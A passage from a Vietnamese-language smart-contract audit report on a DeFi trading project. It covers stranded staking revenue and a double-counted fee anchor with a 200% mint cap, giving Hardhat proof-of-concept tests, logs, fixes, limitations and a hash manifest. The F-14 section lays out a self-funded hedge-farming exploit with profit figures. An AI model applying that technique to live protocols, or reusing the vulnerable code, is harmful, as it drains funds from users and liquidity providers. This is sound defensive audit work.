    console.log(`  [EVIDENCE] totalStaked = ${await W.sink.totalStaked()}, distributable = ${Number(await W.house.distributable()) / 1e6} USDC`);
    const r = await revertOf(W.house.connect(owner).distributeRevenue(U(1000)));
    console.log(`  [EVIDENCE] distributeRevenue(1000 USDC) with no stakers → ${r ?? "OK"}; sink USDC = ${Number(await W.usdc.balanceOf(W.sA)) / 1e6}`);
    // a staker arrives later and can never claim the stranded USDC
    await (await W.diamond.setMinter(owner.address)).wait();
    await (await W.diamond.mint(p2.address, E18(100))).wait();
    await (await W.diamond.connect(p2).approve(W.sA, ethers.MaxUint256)).wait();
    await (await W.sink.connect(p2).stake(E18(100))).wait();
    const claimable = await W.sink.claimable(p2.address);
    console.log(`  [EVIDENCE] late staker claimable = ${claimable} (stranded USDC in sink = ${Number(await W.usdc.balanceOf(W.sA)) / 1e6})`);
    if (!isFixed()) {
      expect(r).to.equal(null);
      expect(claimable).to.equal(0n);
    } else {
      // F-13 fix: the distribution is accepted, but the USDC is CARRIED by the sink and streams to
      // the first staker (nothing is stranded). Late staker gets ~1000 USDC after the 7d stream.
      expect(r).to.equal(null);
      expect(claimable).to.equal(0n);                        // streaming starts now, nothing yet
      await timeTravel(7 * 86400 + 60);
      const c2 = await W.sink.claimable(p2.address);
      console.log(`  [EVIDENCE] fixed: late staker claimable after 7d stream = ${Number(c2) / 1e6} USDC`);
      expect(c2 <= U(1000) && c2 + 2n >= U(1000)).to.equal(true);
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] totalStaked = 0, distributable = 8000 USDC
  [EVIDENCE] distributeRevenue(1000 USDC) with no stakers → OK; sink USDC = 1000
  [EVIDENCE] late staker claimable = 0 (stranded USDC in sink = 1000)
    ✔ owner distributes revenue to an empty staking set; USDC is stranded forever (104ms)
```


#### Đề xuất sửa

Khi `totalStaked == 0`, cộng vào `carry`. Staker đầu tiên khởi động stream từ `carry` (`_addToStream` cộng `carry` và reset về 0).

#### Mã sau sửa

*`contracts/RevenueSplit.sol` · dòng 148–160*

```solidity

    /// Authorized engines only; pulls exactly `amount` from msg.sender (House or Options).
    function notifyRevenue(uint256 amount) external {
        require(msg.sender == house || pusher[msg.sender], "not house");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        _update();
        if (totalStaked > 0) {
            _addToStream(amount);
        } else {
            carry += amount;                        // F-13: never stranded
            emit RevenueCarried(amount);
        }
        emit RevenueNotified(amount, rewardIndex);
```


#### PoC sau sửa

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 87–115*

```javascript
  it("owner distributes revenue to an empty staking set; USDC is stranded forever", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p2 } = W.signers;
    await (await W.house.connect(lp).lpDeposit(U(10_000))).wait();
    await (await W.house.connect(owner).setTargetPool(0)).wait();             // waterfall open
    console.log(`  [EVIDENCE] totalStaked = ${await W.sink.totalStaked()}, distributable = ${Number(await W.house.distributable()) / 1e6} USDC`);
    const r = await revertOf(W.house.connect(owner).distributeRevenue(U(1000)));
    console.log(`  [EVIDENCE] distributeRevenue(1000 USDC) with no stakers → ${r ?? "OK"}; sink USDC = ${Number(await W.usdc.balanceOf(W.sA)) / 1e6}`);
    // a staker arrives later and can never claim the stranded USDC
    await (await W.diamond.setMinter(owner.address)).wait();
    await (await W.diamond.mint(p2.address, E18(100))).wait();
    await (await W.diamond.connect(p2).approve(W.sA, ethers.MaxUint256)).wait();
    await (await W.sink.connect(p2).stake(E18(100))).wait();
    const claimable = await W.sink.claimable(p2.address);
    console.log(`  [EVIDENCE] late staker claimable = ${claimable} (stranded USDC in sink = ${Number(await W.usdc.balanceOf(W.sA)) / 1e6})`);
    if (!isFixed()) {
      expect(r).to.equal(null);
      expect(claimable).to.equal(0n);
    } else {
      // F-13 fix: the distribution is accepted, but the USDC is CARRIED by the sink and streams to
      // the first staker (nothing is stranded). Late staker gets ~1000 USDC after the 7d stream.
      expect(r).to.equal(null);
      expect(claimable).to.equal(0n);                        // streaming starts now, nothing yet
      await timeTravel(7 * 86400 + 60);
      const c2 = await W.sink.claimable(p2.address);
      console.log(`  [EVIDENCE] fixed: late staker claimable after 7d stream = ${Number(c2) / 1e6} USDC`);
      expect(c2 <= U(1000) && c2 + 2n >= U(1000)).to.equal(true);
    }
  });
```


*`fixed-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] totalStaked = 0, distributable = 8000 USDC
  [EVIDENCE] distributeRevenue(1000 USDC) with no stakers → OK; sink USDC = 1000
  [EVIDENCE] late staker claimable = 0 (stranded USDC in sink = 1000)
  [EVIDENCE] fixed: late staker claimable after 7d stream = 999.999999 USDC
    ✔ owner distributes revenue to an empty staking set; USDC is stranded forever (105ms)
```


#### Đánh giá sau sửa

- Staker đến sau nhận được 999.999999 USDC sau 7 ngày. Chênh lệch 1 wei là làm tròn có lợi cho contract.

---

### 4.14 F-14 — Ledger tính phí hai lần và trần 200% cho farm

**Mức độ:** High. **Loại:** farm DIAMOND có lãi, không cần vốn đáng kể.

#### Mô tả và nguyên nhân gốc

Ở `engine/ledger.js`, `payout` đã trừ phí (phí được giữ lại khi trả thưởng). Vì vậy `edge = stakeSum − paySum` **đã bao gồm phí**. Nhưng `anchor = feeSum + edge` lại cộng phí thêm một lần. Anchor bằng gấp đôi thực tế. Anchor quyết định budget mint DIAMOND. Ngoài ra, `LAUNCH_RATE_BPS = 20000` và `R_MAX_BPS = 20000` cho phép mint tới 200% doanh thu thực.

Kết quả: một cặp hedge tự tài trợ (long thắng, short thua) có thể mint nhiều DIAMOND hơn số tiền đã trả cho house.

#### Kịch bản khai thác

1. Farmer mở hai vị thế đối nghịch có cùng notional, M = 1.92 (hoặc 1.99).
2. Một bên thắng, bên kia thua. Farmer thêm một vé nhỏ để đủ điều kiện nhận weight.
3. Ledger tính anchor gấp đôi, rate LAUNCH là 200%, và farmer nhận DIAMOND có giá trị cao hơn chi phí.

#### Mã lỗi (mã gốc)

Ledger (off-chain):

*`audit/vulnerable/engine/ledger.js` · dòng 12–16*

```javascript

export const MINT_RATE = { R_MAX_BPS: 20000, R_FLOOR_BPS: 3000, STEP_DOWN_BPS: 250, STEP_UP_BPS: 1000 };
export const LAUNCH_RATE_BPS = 20000;

/** Mirror of DiamondDistributor.projectedRateBps — given the rate stored on-chain and the
```


*`audit/vulnerable/engine/ledger.js` · dòng 50–58*

```javascript
      a.paid += r.payout;
      a.fees += r.feePaid; acc.set(r.owner, a);
      stakeSum += r.stake; paySum += r.payout; feeSum += r.feePaid;
    }
    const edge = stakeSum > paySum ? stakeSum - paySum : 0n;   // realized house edge (incl. fees)
    const anchor = feeSum + edge;                              // phí thực thu + edge thực hiện
    return { acc, revenue: edge, fees: feeSum, anchor };
  }

```


Trần trên contract:

*`audit/vulnerable/contracts/DiamondDistributor.sol` · dòng 36–39*

```solidity

    uint256 public constant BPS = 10_000;
    uint256 public constant R_MAX_BPS = 20_000;    // 200% launch/bait ceiling
    uint256 public constant R_FLOOR_BPS = 3_000;   // 30% tighten floor
```


#### PoC

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 120–131*

```javascript
  it("ledger anchor vs realized house P&L on the reference epoch", async () => {
    const { EpochLedger, LAUNCH_RATE_BPS } = require(isFixed() ? "../../engine/ledger.js" : "../vulnerable/engine/ledger.js");
    const L = new EpochLedger({ epochMs: 6 * 3600 * 1000 });
    L.add({ owner: "0xA", ts: 10, stake: U(10_000), payout: U(19_800), feePaid: U(200) });
    L.add({ owner: "0xB", ts: 20, stake: U(10_000), payout: 0n, feePaid: U(200) });
    const s = L.summarize(0);
    const pnl = Number(s.revenue) / 1e6;
    console.log(`  [EVIDENCE] realized house P&L (edge, fees already withheld) = ${pnl} USDC`);
    console.log(`  [EVIDENCE] anchor used for the mint budget                 = ${Number(s.anchor) / 1e6} USDC`);
    if (!isFixed()) expect(Number(s.anchor)).to.equal(Number(s.revenue) + Number(s.fees)); // 600 ≠ 200
    else expect(Number(s.anchor)).to.equal(Number(s.revenue));
  });
```


*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 133–156*

```javascript
  it("self-funded hedge pair at M = 1.92 / 1.99: farmer's USD cost vs DIAMOND minted at launch rate", async () => {
    const { EpochLedger, LAUNCH_RATE_BPS } = require(isFixed() ? "../../engine/ledger.js" : "../vulnerable/engine/ledger.js");
    const S = 10_000;               // USDC notional per leg
    const rows = [];
    for (const M of [1.92, 1.99]) {
      const L = new EpochLedger({ epochMs: 6 * 3600 * 1000 });
      const profit = (M - 1) * S, fee = profit * 0.0399, payoutA = S + profit - fee;
      // leg A (long, wins) on wallet A; leg B (short, loses) on wallet B; wallet B also holds a
      // 1-USDC winning decoy so that it "pays rake" and qualifies for mint weight (w = √(netLoss·fees))
      const decoyFee = 1 * (2 - 1) * 0.0399;
      L.add({ owner: "0xA", ts: 10, stake: U(S), payout: BigInt(Math.round(payoutA * 1e6)), feePaid: BigInt(Math.round(fee * 1e6)) });
      L.add({ owner: "0xB", ts: 20, stake: U(S), payout: 0n, feePaid: 0n });
      L.add({ owner: "0xB", ts: 21, stake: U(1), payout: BigInt(Math.round((2 - decoyFee) * 1e6)), feePaid: BigInt(Math.round(decoyFee * 1e6)) });
      const cost = (2 * S + 1) - (payoutA + (2 - decoyFee)); // farmer's total USD loss
      const mm = L.mintAmounts(0, { priceX1e8: 1_000_000n, rateBps: LAUNCH_RATE_BPS });
      const mintUsd = Number(mm.total) / 1e18 * 0.01;   // DIAMOND × $0.01 reference price
      rows.push({ M, cost: cost.toFixed(2), anchor: (Number(mm.anchor) / 1e6).toFixed(2), rate: Number(mm.rateBps) / 100 + "%", mintUsd: mintUsd.toFixed(2), net: (mintUsd - cost).toFixed(2) });
    }
    console.log("  [EVIDENCE] M      cost(USD)  anchor(USD)  rate    DIAMOND→USD   farmer net");
    for (const r of rows) console.log(`  [EVIDENCE] ${String(r.M).padEnd(6)} ${r.cost.padEnd(10)} ${r.anchor.padEnd(12)} ${r.rate.padEnd(7)} ${r.mintUsd.padEnd(13)} ${r.net}`);
    const net192 = parseFloat(rows[0].net);
    if (!isFixed()) expect(net192).gt(0);      // profitable hedge (vulnerable)
    else expect(net192).lte(0.01);              // breakeven at most after fix
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] realized house P&L (edge, fees already withheld) = 200 USDC
  [EVIDENCE] anchor used for the mint budget                 = 600 USDC
    ✔ ledger anchor vs realized house P&L on the reference epoch (103ms)
```


*`vulnerable-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] M      cost(USD)  anchor(USD)  rate    DIAMOND→USD   farmer net
  [EVIDENCE] 1.92   1166.12    1533.24      200%    3066.48       1900.36
  [EVIDENCE] 1.99   494.05     889.10       200%    1778.20       1284.15
    ✔ self-funded hedge pair at M = 1.92 / 1.99: farmer's USD cost vs DIAMOND minted at launch rate
```


#### Đề xuất sửa

1. `anchor = edge` (một lần, không cộng phí thêm).
2. `LAUNCH_RATE_BPS` và `R_MAX_BPS` về 100%: không bao giờ mint nhiều hơn doanh thu thực.

#### Mã sau sửa

*`engine/ledger.js` · dòng 13–17*

```javascript
// F-14 fix: ceiling is 100% of REALIZED revenue. 200% let hedged farms mint more than they
// ever paid the house (the old figures are kept in audit/report as the vulnerable baseline).
export const MINT_RATE = { R_MAX_BPS: 10000, R_FLOOR_BPS: 3000, STEP_DOWN_BPS: 250, STEP_UP_BPS: 1000 };
export const LAUNCH_RATE_BPS = 10000;

```


*`engine/ledger.js` · dòng 50–60*

```javascript
      const a = acc.get(r.owner) || { stake: 0n, paid: 0n, fees: 0n };
      a.stake += r.stake;
      a.paid += r.payout;
      a.fees += r.feePaid; acc.set(r.owner, a);
      stakeSum += r.stake; paySum += r.payout; feeSum += r.feePaid;
    }
    // realized house P&L for the epoch. `payout` already has the fee removed, so stake − payout
    // INCLUDES the fee: the anchor is this number alone (F-14: adding fees again double-counted).
    const edge = stakeSum > paySum ? stakeSum - paySum : 0n;
    const anchor = edge;
    return { acc, revenue: edge, fees: feeSum, anchor };
```


*`contracts/DiamondDistributor.sol` · dòng 44–47*

```solidity

    uint256 public constant BPS = 10_000;
    uint256 public constant R_MAX_BPS = 10_000;    // 100% ceiling: never mint more than realized revenue (F-14)
    uint256 public constant R_FLOOR_BPS = 3_000;   // 30% tighten floor
```


#### PoC sau sửa

*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 120–131*

```javascript
  it("ledger anchor vs realized house P&L on the reference epoch", async () => {
    const { EpochLedger, LAUNCH_RATE_BPS } = require(isFixed() ? "../../engine/ledger.js" : "../vulnerable/engine/ledger.js");
    const L = new EpochLedger({ epochMs: 6 * 3600 * 1000 });
    L.add({ owner: "0xA", ts: 10, stake: U(10_000), payout: U(19_800), feePaid: U(200) });
    L.add({ owner: "0xB", ts: 20, stake: U(10_000), payout: 0n, feePaid: U(200) });
    const s = L.summarize(0);
    const pnl = Number(s.revenue) / 1e6;
    console.log(`  [EVIDENCE] realized house P&L (edge, fees already withheld) = ${pnl} USDC`);
    console.log(`  [EVIDENCE] anchor used for the mint budget                 = ${Number(s.anchor) / 1e6} USDC`);
    if (!isFixed()) expect(Number(s.anchor)).to.equal(Number(s.revenue) + Number(s.fees)); // 600 ≠ 200
    else expect(Number(s.anchor)).to.equal(Number(s.revenue));
  });
```


*`audit/test/F11-F14-ops-and-economics.test.js` · dòng 133–156*

```javascript
  it("self-funded hedge pair at M = 1.92 / 1.99: farmer's USD cost vs DIAMOND minted at launch rate", async () => {
    const { EpochLedger, LAUNCH_RATE_BPS } = require(isFixed() ? "../../engine/ledger.js" : "../vulnerable/engine/ledger.js");
    const S = 10_000;               // USDC notional per leg
    const rows = [];
    for (const M of [1.92, 1.99]) {
      const L = new EpochLedger({ epochMs: 6 * 3600 * 1000 });
      const profit = (M - 1) * S, fee = profit * 0.0399, payoutA = S + profit - fee;
      // leg A (long, wins) on wallet A; leg B (short, loses) on wallet B; wallet B also holds a
      // 1-USDC winning decoy so that it "pays rake" and qualifies for mint weight (w = √(netLoss·fees))
      const decoyFee = 1 * (2 - 1) * 0.0399;
      L.add({ owner: "0xA", ts: 10, stake: U(S), payout: BigInt(Math.round(payoutA * 1e6)), feePaid: BigInt(Math.round(fee * 1e6)) });
      L.add({ owner: "0xB", ts: 20, stake: U(S), payout: 0n, feePaid: 0n });
      L.add({ owner: "0xB", ts: 21, stake: U(1), payout: BigInt(Math.round((2 - decoyFee) * 1e6)), feePaid: BigInt(Math.round(decoyFee * 1e6)) });
      const cost = (2 * S + 1) - (payoutA + (2 - decoyFee)); // farmer's total USD loss
      const mm = L.mintAmounts(0, { priceX1e8: 1_000_000n, rateBps: LAUNCH_RATE_BPS });
      const mintUsd = Number(mm.total) / 1e18 * 0.01;   // DIAMOND × $0.01 reference price
      rows.push({ M, cost: cost.toFixed(2), anchor: (Number(mm.anchor) / 1e6).toFixed(2), rate: Number(mm.rateBps) / 100 + "%", mintUsd: mintUsd.toFixed(2), net: (mintUsd - cost).toFixed(2) });
    }
    console.log("  [EVIDENCE] M      cost(USD)  anchor(USD)  rate    DIAMOND→USD   farmer net");
    for (const r of rows) console.log(`  [EVIDENCE] ${String(r.M).padEnd(6)} ${r.cost.padEnd(10)} ${r.anchor.padEnd(12)} ${r.rate.padEnd(7)} ${r.mintUsd.padEnd(13)} ${r.net}`);
    const net192 = parseFloat(rows[0].net);
    if (!isFixed()) expect(net192).gt(0);      // profitable hedge (vulnerable)
    else expect(net192).lte(0.01);              // breakeven at most after fix
  });
```


*`fixed-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] realized house P&L (edge, fees already withheld) = 200 USDC
  [EVIDENCE] anchor used for the mint budget                 = 200 USDC
    ✔ ledger anchor vs realized house P&L on the reference epoch (103ms)
```


*`fixed-F11-F14-ops-and-economics.txt`*

```text
  [EVIDENCE] M      cost(USD)  anchor(USD)  rate    DIAMOND→USD   farmer net
  [EVIDENCE] 1.92   1166.12    1166.12      100%    1166.12       -0.00
  [EVIDENCE] 1.99   494.05     494.05       100%    494.05        0.00
    ✔ self-funded hedge pair at M = 1.92 / 1.99: farmer's USD cost vs DIAMOND minted at launch rate
```


#### Đánh giá sau sửa

- Anchor bằng đúng P&L thực (200 USDC).
- Farmer hoà vốn (net −0.00 và 0.00), không lãi.
- Phần còn lại: farm ở mức hoà vốn vẫn nhận DIAMOND tương đương phí đã trả. Đây là quyết định thiết kế kinh tế (mục 6).
- Hạn chế: PoC này kiểm ở tầng engine off-chain. Nó không chứng minh contract đã được bảo vệ tuyệt đối trước việc anchor sai, vì contract chỉ kiểm budget theo anchor do budgeter ký.

---

## 5. Các điểm đã đánh giá nhưng chưa có PoC

Mục này liệt kê những gì tôi đã phân tích nhưng **chưa viết PoC**. Tôi không ghi chúng là "đã xác nhận".

| ID | Mức | Mô tả | Lý do chưa có PoC | Hướng xử lý |
|---|---|---|---|---|
| H5 | Low | `lpRequestExit` đặt lại `lpExitAvailableAt = now + LP_LOCK` cho toàn bộ share đang chờ của người gọi (`DiamondHouse.sol` L346–352 mã gốc). Người dùng có thể tự gia hạn lock của chính mình. | Chỉ tự gây hại, không ăn cắp tiền của người khác. | Có thể giữ nguyên, hoặc chỉ đặt lock cho phần share mới. |
| D2 | Low | Chữ ký budget không bind `chainid` và địa chỉ contract. | Đã vá bằng `budgetHash` (F-03). Chưa viết PoC riêng. | Đã vá. |
| V1 | Medium (phụ thuộc owner) | `setAttester` (`Verifiers.sol` L48–52, L141–145) không timelock, không kiểm số attester ≥ threshold. Owner có thể thêm attester của mình để đủ quorum, hoặc gỡ attester để làm mọi settle revert. | Đây là quyền owner, không phải lỗ hổng kỹ thuật. Cần quyết định governance. | Multisig + timelock; kiểm `count ≥ threshold` khi gỡ. |
| O3 | Medium (phụ thuộc attester) | `settleWithPrice` tin `closePx` do attester ký, không ràng buộc thời điểm đóng. Attester có thể ký giá cũ hoặc giá mới để đổi kết quả. | Cần đặc tả oracle (thời điểm, nguồn giá) trước khi viết PoC có ý nghĩa. | Ràng buộc `closePx` với timestamp và nguồn giá trong chữ ký. |
| Gov-1 | Medium | Owner có thể đổi sink, verifier (đã có timelock sau F-08), attester, minter, targetPool, budgetAttester, classCfg mà không timelock. | Đây là mô hình quyền, không phải một lỗi trong một hàm. | Multisig, timelock, và ghi rõ trong README. |
| N1 | Low | `setClassCfg` "tighten-only" có thể bị bypass bằng disable → nâng cap → enable. | Cap chỉ kiểm lúc mua vé, nên không ảnh hưởng vé đang mở. Đây là quyết định governance. | Xem mục 6. |
| N2 | Medium (kinh tế) | Nạp LP khi NAV = 0 (sau F-06) và `totalShares > 0`: người nạp mới nhận gần như toàn bộ lợi nhuận tương lai so với LP cũ đã bị xoá sạch. | Không ăn cắp tiền đã thực hiện, chỉ chia lại lợi nhuận tương lai. Chặn có thể cản việc bơm vốn cứu hàng đợi. | Mục 6. |

---

## 6. Rủi ro còn lại và quyết định cần người dùng chốt

### 6.1 Đã vá trong mã (tóm tắt)

Virtual shares (F-04/F-05); solvency `>=` và `sweepSurplus` (F-01); NAV trừ `queueDebt` (F-06); `_send` + credit + gas floor (F-11); streaming 7 ngày và carry (F-02/F-13); ttl và quote single-use trong chữ ký (F-09/F-10); `budgetHash`, cap theo epoch và kiểm budget attester (F-03/F-12b/D2); anchor = edge và trần 100% (F-14); sink có kiểm mã và thu hồi approve, timelock 2 ngày cho quoter/verifier (F-08); deploy guard không có khoá mặc định (F-07); queue không ghi entry 0 (F-12a).

### 6.2 Quyết định cần người dùng

1. **Governance (Gov-1, V1):** owner có được đổi attester, budgetAttester, sink, minter, targetPool mà không timelock không? Nếu không, cần multisig và timelock, và README phải ghi rõ mức tin cậy.
2. **N1 (tighten-only):** có cấm nới cap class đã từng bật không? Cách đơn giản là kiểm `old.maxMultX1e4 != 0` thay vì `old.enabled`.
3. **N2 (LP tại NAV = 0):** chặn nạp khi NAV = 0, hay cho phép để bơm vốn trả hàng đợi?
4. **F-14 ở 100%:** chấp nhận farm hoà vốn không, hay giảm thêm trần và LAUNCH rate?
5. **Khoá production:** tạo ngoài repo (KMS/HSM), tách quoter, attester và budgeter ra các máy khác nhau, và không dùng bất kỳ mnemonic nào.
6. **Giá định theo τ = 60 (F-09):** giả định σ = 0.0004 có khớp dữ liệu thị trường không? Nếu không, định giá lại.

---

## 7. Kiểm chứng tổng hợp và giới hạn

### 7.1 Kết quả chạy cuối

| Lệnh | Kết quả | File log |
|---|---|---|
| `npm run audit:poc` (mã gốc) | 18 passing, 2 pending, EXIT 0 | `audit/evidence/poc-vulnerable-final.txt` |
| `npm run audit:regress` (mã vá) | 19 passing, 1 pending, EXIT 0 | `audit/evidence/regress-fixed-final.txt` |
| `npm test` (suite gốc) | diamond 133 passed / 0 failed; engine 51 passed / 0 failed; fuzz SEED=1337 OK (160 kiểm tra, 34 buys, 24 settles, 8 stall refunds, 47 harvests), EXIT 0 | `audit/evidence/root-suite-run.txt` |
| Từng file, mã gốc | Chi tiết theo file | `audit/evidence/per-file/vulnerable-*.txt` |
| Từng file, mã vá | Chi tiết theo file | `audit/evidence/per-file/fixed-*.txt` |

Các pending có ý nghĩa: trên mã gốc, 2 pending là test guard của F-07 (chỉ có ý nghĩa trên mã vá). Trên mã vá, 1 pending là PoC F-07 (chỉ có ý nghĩa trên mã gốc). Đây là thiết kế, không phải lỗi.

### 7.2 Cảnh báo không ảnh hưởng kết quả

Khi chạy suite gốc có dòng `Cannot find module '../binaries/uws_linux_x64_127.node'`. Đây là cảnh báo của ganache (uWebSockets không có binary cho Node này). Ganache tự chuyển sang triển khai NodeJS và test vẫn chạy đầy đủ.

### 7.3 Lỗi harness đã sửa trong quá trình audit

Trước đây `audit/lib/world.js` ghim cứng set `"fixed"` cho `DiamondToken`, `MockUSDC` và `DiamondDistributor`. Nhánh vulnerable có thể dùng nhầm mã đã vá. Đã sửa để mọi contract đều dùng `SET`. Log chạy trước khi sửa được để trong `audit/evidence/superseded/` và không dùng làm bằng chứng.

### 7.4 Giới hạn

- **Không dùng Foundry.** Sandbox chặn tải binary Foundry và solc. Dùng Hardhat 2.22 + solc-js 0.8.26. Không có fuzz/invariant kiểu Foundry.
- **"Chain local" là Hardhat network trong tiến trình**, không phải node anvil hay ganache riêng. `scripts/deploy.js` chưa được chạy end-to-end trên một node local. Chỉ kiểm guard.
- **Fuzz không phải bằng chứng đầy đủ.** `test/fuzz.js` coi mọi revert là "expected". Đã có một lần lỗi chữ ký làm fuzz vô hiệu (0 lần mua, vẫn báo OK) và đã sửa. Cần siết lại để chỉ chấp nhận revert có lý do dự kiến.
- **Không kiểm riêng ECDSA malleability.** Đã giảm rủi ro nhờ `quoteUsed` theo digest, nhưng chưa có test riêng.
- **Không có mô hình hình thức (formal verification).**
- **Engine off-chain** chỉ kiểm theo ví dụ và công thức trong tài liệu, không kiểm mọi đầu vào.
- **Không đánh giá vận hành** (quản lý khoá, hạ tầng oracle/attester, monitoring, incident response).
- **Tính "không còn lỗi khác" không được chứng minh.** Báo cáo chỉ khẳng định: các lỗi liệt kê đã được tái hiện, đã vá và đã kiểm lại, và các đường tiền đã rà soát không có lỗi nào khác được phát hiện trong phạm vi và phương pháp ở mục 2.

---

## 8. Phụ lục

### A. Diff bản vá

Toàn bộ diff so với commit gốc `3cb964b` (contracts, engine, scripts, README) nằm trong `audit/report/fixes.diff`.

Thống kê thay đổi:

```text
 diamondtrading/README.md                        |   7 +-
 diamondtrading/contracts/DiamondDistributor.sol |  23 +++-
 diamondtrading/contracts/DiamondHouse.sol       | 148 ++++++++++++++++++++----
 diamondtrading/contracts/DiamondOptions.sol     | 104 +++++++++++++++--
 diamondtrading/contracts/RevenueSplit.sol       | 109 +++++++++++++++--
 diamondtrading/engine/ledger.js                 |  24 ++--
 diamondtrading/engine/quoter.js                 |  14 ++-
 diamondtrading/scripts/deploy.js                |  44 ++++++-
 8 files changed, 409 insertions(+), 64 deletions(-)
```


### B. Log đầy đủ

Log đầy đủ của lần chạy cuối (không cắt) nằm trong `audit/evidence/`:

- `poc-vulnerable-final.txt`: toàn bộ 18 PoC trên mã gốc.
- `regress-fixed-final.txt`: toàn bộ 19 test trên mã vá.
- `root-suite-run.txt`: suite gốc (diamond, engine, fuzz).

### C. Manifest SHA-256

Băm của các file bằng chứng và file test, để kiểm tra không bị sửa:

| SHA-256 | Bytes | File |
|---|---:|---|
| `e7c216f99987c1ec58a09348adcd4cb8600e329eb35d3bac4a2fcaf2c581bd85` | 7780 | `audit/evidence/poc-vulnerable-final.txt` |
| `8a17749f4ea9db505e4a16957b5911175da0662bb37bd1a52475934622bf6bf4` | 7489 | `audit/evidence/regress-fixed-final.txt` |
| `5c7faf1162ff5715423f1bfc47f63cbc773e6a93ea2b98c92129dd66814e9143` | 12233 | `audit/evidence/root-suite-run.txt` |
| `537701065e229133cf2b0a819081b1f2753b01d536926cdbc30811aadf05fa19` | 707 | `audit/evidence/per-file/fixed-F01-donation-freeze.txt` |
| `635433bd18163dbb974dccceff88edf19a63fd603143e79138499c2edf77db0b` | 501 | `audit/evidence/per-file/fixed-F02-jit-stake-reward-theft.txt` |
| `5c18e3745160e169b00b7c452612ebe834c3f1f1a522f9b120a47516801fa6d7` | 512 | `audit/evidence/per-file/fixed-F03-distributor-unbounded-claims.txt` |
| `b8f25562ac9568d98721ce86e32a31311e4a3b5c67a9d34c3fd5db0217fbd4a1` | 795 | `audit/evidence/per-file/fixed-F04-F05-lp-vault-theft.txt` |
| `bb3d9319a7ca7dcb36eb836ba2bb30d39ee3dcb7998b7641b40d5e86dfae1190` | 1638 | `audit/evidence/per-file/fixed-F06-F08-admin-and-queue.txt` |
| `de8d31accea3f7ccbac76fde2e6cbfd31ce7cc9ac0516ad8bbfade03c7c3e98b` | 1417 | `audit/evidence/per-file/fixed-F09-F10-quote-binding.txt` |
| `718c6f7d6289f45d405b039306ad87638e9dfb307e79f53079cd483324362727` | 1796 | `audit/evidence/per-file/fixed-F11-F14-ops-and-economics.txt` |
| `523cc1dc4aadc4cd8a5e83e55f328ee82e1c01b7727a2a6ab3a491dd6600d223` | 771 | `audit/evidence/per-file/vulnerable-F01-donation-freeze.txt` |
| `58b9b9fb8c90671d524881a96c4a19cc064609449c412c41963b91a94b203a69` | 520 | `audit/evidence/per-file/vulnerable-F02-jit-stake-reward-theft.txt` |
| `04bf967650d6910c8a8e2f071715414b14716c5c440103ad9b37dbc60b264f0f` | 509 | `audit/evidence/per-file/vulnerable-F03-distributor-unbounded-claims.txt` |
| `f9689787b9f4be1dd3e20ac53280b89041c45320659bc562a08cd5579f5fd93d` | 894 | `audit/evidence/per-file/vulnerable-F04-F05-lp-vault-theft.txt` |
| `08f6951186a0c0f12d7f1379495751b998253a1f77f50c2070aa20ed85ad5c5b` | 1779 | `audit/evidence/per-file/vulnerable-F06-F08-admin-and-queue.txt` |
| `1597e07ac88e2765aabd268ffd0f1fbc7e657216abe822a124d822f56adda4ae` | 1454 | `audit/evidence/per-file/vulnerable-F09-F10-quote-binding.txt` |
| `622499ad0c492eaa35d518c5380a5676bb1967b06fb4973c332bcd7170a2c192` | 1732 | `audit/evidence/per-file/vulnerable-F11-F14-ops-and-economics.txt` |
| `eb7687b5b998935086bbae50eca6f1e9c574c90b5e99113730571714d8696712` | 4599 | `audit/test/F01-donation-freeze.test.js` |
| `1f716d1ad0e164aacd5e1bba36a2eeceb53a8d4e74a41ed30be94676f1921a19` | 4068 | `audit/test/F02-jit-stake-reward-theft.test.js` |
| `4fecf621cddbad425182ef252d007d8611ecd59e20db8e75992d7f367f16e646` | 3553 | `audit/test/F03-distributor-unbounded-claims.test.js` |
| `b3426b2968a1413d2a4f7c15fb61c3c8ce7c7162d700c1406cecc12882514fd2` | 4980 | `audit/test/F04-F05-lp-vault-theft.test.js` |
| `3bec2017f717703ed282f8ebb64299f5dcb7b2797069fed8fd29642fa58180d2` | 10573 | `audit/test/F06-F08-admin-and-queue.test.js` |
| `66969eba54482b3b78fbb749f4aaf8e3bce11ef260b11af58a32c12b8542466b` | 4977 | `audit/test/F09-F10-quote-binding.test.js` |
| `75a99ca0d0ae9a5e3858ff8cd7b2594f2f4f0e7e979c9c94baeef1c5cb8771fc` | 10735 | `audit/test/F11-F14-ops-and-economics.test.js` |
| `14b53c24e4e1f712653b32f10dac13cf40b8a12b1ec1c0564bfae7a0ccc5a1e1` | 8222 | `audit/vulnerable/contracts/DiamondDistributor.sol` |
| `5f6388fbd6fb9521fa17e91fe4d280d297c815fc66c804ecb64aebedb2c07ee9` | 20685 | `audit/vulnerable/contracts/DiamondHouse.sol` |
| `e1f12803e0711f0a8f1ed7fd113865ecacf020bf7cf4a88f6b569de8e2a7412f` | 15057 | `audit/vulnerable/contracts/DiamondOptions.sol` |
| `3f97c3ee22dfb1e4be5f8849fcbe89eac5451484579414615c69bed50018b85d` | 3776 | `audit/vulnerable/contracts/DiamondToken.sol` |
| `105c8a33f7cdcbd100bea1f590a40fe37d9097bdeb1f7ba778e5e7592cecf148` | 1736 | `audit/vulnerable/contracts/MockUSDC.sol` |
| `bcc477793fa6ee32bfae90f8977dacd11fdcbb816661abe8bf54d8e0ac9da8d7` | 4675 | `audit/vulnerable/contracts/RevenueSplit.sol` |
| `b301faf1799defedd6f1f085c543b8928419be3480aa8719e542812635021234` | 7833 | `audit/vulnerable/contracts/Verifiers.sol` |
| `da086ce496acf034bca1f012226ac5c9967ecf307c1ca7270b6af21d9b9b4211` | 7195 | `audit/vulnerable/engine/ledger.js` |
